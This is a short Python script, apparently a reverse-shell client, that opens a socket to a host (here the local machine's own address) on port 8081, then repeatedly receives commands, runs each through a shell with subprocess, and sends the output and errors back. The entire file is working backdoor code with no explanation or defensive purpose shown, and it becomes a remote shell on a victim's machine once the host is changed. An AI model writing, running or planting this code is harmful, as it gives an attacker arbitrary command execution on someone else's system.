import socket
import subprocess

remote_host = socket.gethostbyname(socket.gethostname())
remote_port = 8081

client = socket.socket()
client.connect((remote_host, remote_port))

while True:
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    
    client.send(output + output_error)